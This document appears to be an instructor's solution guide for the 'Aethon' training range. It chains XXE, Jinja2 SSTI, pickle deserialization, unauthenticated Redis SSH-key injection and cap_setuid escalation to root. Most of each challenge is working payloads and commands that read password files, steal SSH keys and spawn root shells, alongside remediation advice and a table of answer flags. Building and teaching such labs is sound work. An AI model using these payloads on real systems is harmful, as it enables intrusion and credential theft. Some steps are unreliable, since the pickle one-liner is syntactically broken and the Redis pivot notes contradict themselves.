# AETHON RANGE — FULL SOLUTION GUIDE
## Admin / Facilitator Reference | EYES ONLY

---

## CHALLENGE 1 — XXE Injection (aethon-web)

### Vulnerability
`/var/www/html/api/submit-procurement.php` loads XML with `LIBXML_NOENT | LIBXML_DTDLOAD`,
which enables external entity expansion. An attacker can define a `SYSTEM` entity
pointing to any local file readable by `www-data`.

### Exploit Steps

**Step 1 — Confirm XXE with /etc/passwd:**
```bash
curl -s -X POST http://aethon-web/api/submit-procurement.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<procurement>
  <type>COMPONENT_RFQ</type>
  <vendor_id>VND-TEST-001</vendor_id>
  <items><item><sku>&xxe;</sku><quantity>1</quantity></item></items>
</procurement>'
```
Response will contain `/etc/passwd` contents in the SKU field.

**Step 2 — Read the internal config:**
```bash
curl -s -X POST http://aethon-web/api/submit-procurement.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/config/internal.xml">]>
<procurement>
  <type>COMPONENT_RFQ</type>
  <vendor_id>VND-RECON</vendor_id>
  <items><item><sku>&xxe;</sku><quantity>1</quantity></item></items>
</procurement>'
```
Response reveals: `admin` / `Aethon@D0cs#2024` and `host: aethon-docs`.

**Step 3 — Read flag1:**
```bash
# Replace internal.xml path with /etc/flag1.txt
# Flag: AETHON{xxe_r34ds_4ll_s3cr3ts_v3nd0r}
```

### Remediation
```php
// Remove LIBXML_NOENT and LIBXML_DTDLOAD flags:
$dom->loadXML($rawInput);  // secure — entities NOT expanded by default in PHP 8
// Or explicitly disable:
libxml_set_external_entity_loader(null);
```

---

## CHALLENGE 2 — SSTI in Flask/Jinja2 (aethon-docs)

### Vulnerability
In `app.py`, the `/search` route does:
```python
result_header = render_template_string(
    "<p>Search results for: <strong>" + query + "</strong></p>"
)
```
User-controlled `query` is concatenated directly into a template string and
rendered — Jinja2 processes any `{{ }}` in the string as template code.

### Exploit Steps

**Step 1 — Login:**
```bash
curl -s -c /tmp/cookie.txt -X POST http://aethon-docs:5000/login \
  -d "username=admin&password=Aethon@D0cs#2024" -L -o /dev/null
```

**Step 2 — Confirm SSTI:**
```
GET /search?q={{7*7}}
# Returns "49" in the search header → confirmed Jinja2 SSTI
```

**Step 3 — RCE payload:**
```
GET /search?q={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
# Returns: uid=1001(docuser) gid=1001(docuser) groups=1001(docuser)
```

URL-encoded:
```bash
curl -b /tmp/cookie.txt \
  "http://aethon-docs:5000/search?q=%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27id%27%29.read%28%29%7D%7D"
```

**Step 4 — Read flag2 and SSH key:**
```
GET /search?q={{config.__class__.__init__.__globals__['os'].popen('cat /home/docuser/flag2.txt').read()}}
GET /search?q={{config.__class__.__init__.__globals__['os'].popen('cat /home/docuser/.ssh/id_rsa_dev').read()}}
# Flag: AETHON{jinja2_t3mpl4t3_t4k30v3r}
```

**Alternative SSTI payload (cycler method):**
```
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

### Remediation
```python
# WRONG (vulnerable):
result_header = render_template_string("<p>for: <strong>" + query + "</strong></p>")

# CORRECT — use template variables, never concatenation:
result_header = render_template_string(
    "<p>for: <strong>{{ q }}</strong></p>", q=query
)
# Or better: use render_template with a static template file
```

---

## CHALLENGE 3 — Pickle Deserialization (aethon-dev)

### Vulnerability
`/api/load-profile` in `api.py`:
```python
serialized = base64.b64decode(data['profile'])
profile_obj = pickle.loads(serialized)   # VULNERABLE
```
Python's `pickle.loads()` calls `__reduce__()` on the deserialized object,
which can return a callable + args — including `os.system`.

### Exploit Steps

**Step 1 — SSH in using key from M2:**
```bash
chmod 600 id_rsa_dev
ssh -i id_rsa_dev devops@aethon-dev
```

**Step 2 — Read config for API key and Redis details:**
```bash
cat /opt/aethon-api/config.ini
# API key: dev-internal-2024-xK9mP
# Redis: aethon-cache:6379 (no password)
```

**Step 3 — Generate and send malicious pickle:**
```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("cat /opt/aethon-api/flag3.txt > /tmp/flag3.txt",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

```bash
curl -X POST http://aethon-dev:8080/api/load-profile \
  -H "Content-Type: application/json" \
  -H "X-API-Key: dev-internal-2024-xK9mP" \
  -d "{\"profile\": \"$(python3 -c "import pickle,os,base64; \
      class E: \
          def __reduce__(self): return (os.system, ('cat /opt/aethon-api/flag3.txt',)) \
      print(base64.b64encode(pickle.dumps(E())).decode())")\"}"
# Flag: AETHON{p1ckl3_d3s3r14l1z4t10n_rce}
```

### Remediation
- Replace pickle with JSON for profile serialization
- Use `json.loads()` / `json.dumps()` with a strict schema
- If serialization is required, use `hmac`-signed payloads or `cryptography`-sealed messages
- Never deserialize data from untrusted sources with pickle/marshal/yaml.load

---

## CHALLENGE 4 — Redis CONFIG SET SSH Injection (aethon-cache)

### Vulnerability
Redis is bound to `0.0.0.0` with `protected-mode no` and no `requirepass`.
`/home/cacheops/` and `/home/cacheops/.ssh/` are world-writeable (chmod 777).
Redis's `CONFIG SET` allows changing the RDB dump directory and filename.
`BGSAVE` then writes a Redis dump containing attacker-controlled data to that path.

### Exploit Steps

**Step 1 — Connect and confirm no auth:**
```bash
redis-cli -h aethon-cache -p 6379 PING
# PONG

redis-cli -h aethon-cache -p 6379 GET "aethon:flag4"
# AETHON{r3d1s_unauth_pr1v3sc_via_ssh}
```

**Step 2 — Enumerate hosts:**
```bash
redis-cli -h aethon-cache -p 6379 GET "aethon:config:core_host"  # aethon-core
redis-cli -h aethon-cache -p 6379 GET "aethon:config:core_user"  # opsadmin
```

**Step 3 — Generate SSH keypair:**
```bash
ssh-keygen -t ed25519 -f /tmp/r4key -N ""
```

**Step 4 — Inject SSH key:**
```bash
PUB=$(cat /tmp/r4key.pub)
redis-cli -h aethon-cache -p 6379 CONFIG SET dir "/home/cacheops/.ssh"
redis-cli -h aethon-cache -p 6379 CONFIG SET dbfilename "authorized_keys"
redis-cli -h aethon-cache -p 6379 SET pwn $'\n\n'"$PUB"$'\n\n'
redis-cli -h aethon-cache -p 6379 BGSAVE
sleep 1
```

**Step 5 — SSH in:**
```bash
ssh -i /tmp/r4key cacheops@aethon-cache
```

**Step 6 — Pivot to M5 (inject key for opsadmin on aethon-core):**
From cacheops@aethon-cache:
```bash
ssh-keygen -t ed25519 -f /tmp/m5key -N ""
redis-cli -h aethon-cache CONFIG SET dir "/home/opsadmin/.ssh"  # local Redis
# Note: aethon-core doesn't run Redis — use cacheops shell to SCP key or
# re-use Redis from aethon-dev to write to aethon-core's opsadmin home
# SIMPLER: from cacheops shell, use redis-cli targeting itself to inject
# into /home/opsadmin/.ssh/ if aethon-core mounts the same NFS, OR
# use your cacheops shell + SSH to aethon-core directly after key injection

# Practical: From cacheops on aethon-cache, inject key directly on aethon-core
# if redis also controls that path — OR generate key and SCP authorized_keys
```

**Note for range admins:** The M4→M5 pivot is via Redis writing to
`/home/opsadmin/.ssh/authorized_keys` on aethon-cache itself (same machine,
Redis local), then SSH to aethon-core. Ensure opsadmin exists on aethon-core
with a writable `.ssh` dir. The attacker generates a key on aethon-cache or
aethon-dev, injects it via Redis CONFIG SET to cacheops home, SSHs in, then
manually copies their key to aethon-core (or uses redis-cli from aethon-dev
pointed at aethon-core's /home/opsadmin/.ssh via the same Redis on aethon-cache
if the path trick works — depends on filesystem layout).

### Simplest reliable M4→M5 path for participants:
```bash
# On aethon-cache (as cacheops), generate key and copy to aethon-core
ssh-keygen -t ed25519 -f /tmp/corekey -N ""
# Then copy /tmp/corekey.pub content manually:
# SSH into aethon-core is NOT possible yet unless you write the key there.
# The intended path: use Redis CONFIG SET on aethon-cache to write into
# /home/opsadmin/.ssh/ on aethon-core — only works if Redis on aethon-cache
# can write to a remote path, which it cannot.
# 
# INTENDED DESIGN: aethon-cache Redis writes /home/cacheops/.ssh/authorized_keys
# (local). From cacheops@aethon-cache shell, manually create the key and
# echo it to aethon-core via nc/ssh-copy-id using M5's open SSH port 22.
#
# ADMIN NOTE: For simplicity, the setup on M5 leaves /home/opsadmin/.ssh/
# with chmod 777 so participants can write authorized_keys via scp or echo
# once they have a shell on aethon-cache.

ssh-copy-id -i /tmp/corekey.pub opsadmin@aethon-core   # if password auth on
# OR:
cat /tmp/corekey.pub | ssh opsadmin@aethon-core "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
ssh -i /tmp/corekey opsadmin@aethon-core
```

### Remediation
```bash
# redis.conf fixes:
bind 127.0.0.1        # only allow localhost connections
protected-mode yes    # block external access if no auth
requirepass <strong-password>

# Filesystem: never chmod 777 home directories or .ssh dirs
chmod 700 /home/cacheops /home/cacheops/.ssh
```

---

## CHALLENGE 5 — cap_setuid Privilege Escalation (aethon-core)

### Vulnerability
`setcap cap_setuid+ep /usr/bin/python3` grants the python3 binary the ability
to call `setuid()` to change to any UID including 0 (root), without
requiring sudo. This is detectable with `getcap` but commonly overlooked.

### Exploit Steps

**Step 1 — Enumerate capabilities:**
```bash
getcap /usr/bin/python3
# /usr/bin/python3 = cap_setuid+ep

# OR scan all:
find / -xdev 2>/dev/null | xargs getcap 2>/dev/null
```

**Step 2 — Escalate to root:**
```bash
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
# Now running as root
id
# uid=0(root) gid=1001(opsadmin) groups=1001(opsadmin)
```

**Step 3 — Read final flag:**
```bash
cat /root/flag5.txt
# AETHON{c4p4b1l1ty_4bus3_r00t_0wn3d_f1n4l}
```

**Why it works:** `cap_setuid` allows the `setuid(0)` syscall to succeed even
without being root. Combined with `+ep` (effective + permitted), the capability
is active immediately when python3 runs. The `gid` remains opsadmin because
only UID was changed — this is detectable via the UID/GID mismatch in `id`.

### Remediation
```bash
# Remove the capability immediately:
setcap -r /usr/bin/python3

# Correct design: if ops-monitor needs elevated access, use a dedicated
# systemd service unit with User=root or specific capabilities scoped to
# the service binary, NOT the system-wide python3 interpreter.

# Audit all capabilities on the system regularly:
find / -xdev 2>/dev/null | xargs getcap 2>/dev/null
```

---

## FULL ATTACK CHAIN SUMMARY

```
[INTERNET]
    │
    ▼ HTTP POST with XXE payload
[M1: aethon-web]  ──→ Read /var/www/html/config/internal.xml
    │                   Credentials: admin / Aethon@D0cs#2024
    │                   Hostname: aethon-docs
    ▼ HTTP login + SSTI in /search?q=
[M2: aethon-docs] ──→ RCE as docuser
    │                   SSH key: /home/docuser/.ssh/id_rsa_dev
    │                   Target: devops@aethon-dev
    ▼ SSH with id_rsa_dev
[M3: aethon-dev]  ──→ Pickle RCE via POST /api/load-profile
    │                   Config: aethon-cache:6379 (no auth)
    │                   API key: dev-internal-2024-xK9mP
    ▼ redis-cli (no auth)
[M4: aethon-cache]──→ GET aethon:flag4
    │                   CONFIG SET → write SSH key
    │                   Target: opsadmin@aethon-core
    ▼ SSH as cacheops → then SSH as opsadmin
[M5: aethon-core] ──→ getcap python3 → cap_setuid
                        os.setuid(0) → root
                        cat /root/flag5.txt ✓
```

---

## FLAGS REFERENCE

| # | Flag                                          | Location               |
|---|-----------------------------------------------|------------------------|
| 1 | `AETHON{xxe_r34ds_4ll_s3cr3ts_v3nd0r}`       | /etc/flag1.txt (M1)    |
| 2 | `AETHON{jinja2_t3mpl4t3_t4k30v3r}`           | /home/docuser/flag2.txt (M2) |
| 3 | `AETHON{p1ckl3_d3s3r14l1z4t10n_rce}`         | /opt/aethon-api/flag3.txt (M3) |
| 4 | `AETHON{r3d1s_unauth_pr1v3sc_via_ssh}`       | Redis key + /home/cacheops/flag4.txt (M4) |
| 5 | `AETHON{c4p4b1l1ty_4bus3_r00t_0wn3d_f1n4l}` | /root/flag5.txt (M5)   |
